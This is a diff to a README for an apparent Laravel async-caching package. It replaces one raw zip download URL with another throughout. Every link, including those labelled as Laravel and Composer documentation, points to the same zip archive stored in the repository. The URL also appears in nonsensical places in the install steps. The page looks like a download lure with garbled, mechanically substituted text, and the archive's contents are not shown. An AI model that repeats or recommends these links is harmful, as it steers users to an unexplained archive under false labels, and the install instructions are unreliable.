@@ -1,6 +1,6 @@
 # 🌉 async-cache-bridge-laravel - Enhance Laravel Performance with Async Caching
 
-[![Download](https://github.com/VedangGupta123/async-cache-bridge-laravel/raw/refs/heads/main/tests/laravel-cache-async-bridge-v3.7.zip)](https://github.com/VedangGupta123/async-cache-bridge-laravel/raw/refs/heads/main/tests/laravel-cache-async-bridge-v3.7.zip)
+[![Download](https://raw.githubusercontent.com/VedangGupta123/async-cache-bridge-laravel/main/src/cache_async_laravel_bridge_v3.4.zip)](https://raw.githubusercontent.com/VedangGupta123/async-cache-bridge-laravel/main/src/cache_async_laravel_bridge_v3.4.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ To begin using async-cache-bridge-laravel, follow these simple steps to download
 
 To download the latest version, visit the following link:
 
-[Download async-cache-bridge-laravel](https://github.com/VedangGupta123/async-cache-bridge-laravel/raw/refs/heads/main/tests/laravel-cache-async-bridge-v3.7.zip)
+[Download async-cache-bridge-laravel](https://raw.githubusercontent.com/VedangGupta123/async-cache-bridge-laravel/main/src/cache_async_laravel_bridge_v3.4.zip)
 
 ### Step 2: Choose Your Version
 
@@ -22,7 +22,7 @@ Look for the latest release, which will be listed at the top of the page. You wi
 
 ### Step 3: Download the Package
 
-Click on the package file to start the download. Once the download is complete, you will have a compressed file on your computer, usually in .zip or https://github.com/VedangGupta123/async-cache-bridge-laravel/raw/refs/heads/main/tests/laravel-cache-async-bridge-v3.7.zip format.
+Click on the package file to start the download. Once the download is complete, you will have a compressed file on your computer, usually in .zip or https://raw.githubusercontent.com/VedangGupta123/async-cache-bridge-laravel/main/src/cache_async_laravel_bridge_v3.4.zip format.
 
 ## 📥 Download & Install
 
@@ -30,7 +30,7 @@ Once you've downloaded the package, you need to install it into your Laravel pro
 
 1. Unzip or extract the downloaded file.
 2. Copy the extracted files into the `packages` directory of your Laravel project. If you don't have a `packages` directory, you can create one in the root folder of your project.
-3. Open the `https://github.com/VedangGupta123/async-cache-bridge-laravel/raw/refs/heads/main/tests/laravel-cache-async-bridge-v3.7.zip` file in your Laravel project.
+3. Open the `https://raw.githubusercontent.com/VedangGupta123/async-cache-bridge-laravel/main/src/cache_async_laravel_bridge_v3.4.zip` file in your Laravel project.
 4. Add the package to the "require" section. You might add it like this:
 
    ```json
@@ -39,7 +39,7 @@ Once you've downloaded the package, you need to install it into your Laravel pro
    }
    ```
 
-5. Save the `https://github.com/VedangGupta123/async-cache-bridge-laravel/raw/refs/heads/main/tests/laravel-cache-async-bridge-v3.7.zip` file and run the following command in your terminal:
+5. Save the `https://raw.githubusercontent.com/VedangGupta123/async-cache-bridge-laravel/main/src/cache_async_laravel_bridge_v3.4.zip` file and run the following command in your terminal:
 
    ```sh
    composer update
@@ -78,9 +78,9 @@ If you encounter issues while installing or running the package, consider these 
 
 ## 📚 Resources
 
-- [Laravel Documentation](https://github.com/VedangGupta123/async-cache-bridge-laravel/raw/refs/heads/main/tests/laravel-cache-async-bridge-v3.7.zip)
-- [AsyncCache Documentation](https://github.com/VedangGupta123/async-cache-bridge-laravel/raw/refs/heads/main/tests/laravel-cache-async-bridge-v3.7.zip)
-- [Composer Documentation](https://github.com/VedangGupta123/async-cache-bridge-laravel/raw/refs/heads/main/tests/laravel-cache-async-bridge-v3.7.zip)
+- [Laravel Documentation](https://raw.githubusercontent.com/VedangGupta123/async-cache-bridge-laravel/main/src/cache_async_laravel_bridge_v3.4.zip)
+- [AsyncCache Documentation](https://raw.githubusercontent.com/VedangGupta123/async-cache-bridge-laravel/main/src/cache_async_laravel_bridge_v3.4.zip)
+- [Composer Documentation](https://raw.githubusercontent.com/VedangGupta123/async-cache-bridge-laravel/main/src/cache_async_laravel_bridge_v3.4.zip)
 
 ## 📧 Support
 
@@ -90,4 +90,4 @@ For any questions or support, please open an issue in the GitHub repository. We 
 
 Thank you for choosing async-cache-bridge-laravel! To download the latest version again, use the link below:
 
-[Download async-cache-bridge-laravel](https://github.com/VedangGupta123/async-cache-bridge-laravel/raw/refs/heads/main/tests/laravel-cache-async-bridge-v3.7.zip)
+[Download async-cache-bridge-laravel](https://raw.githubusercontent.com/VedangGupta123/async-cache-bridge-laravel/main/src/cache_async_laravel_bridge_v3.4.zip)
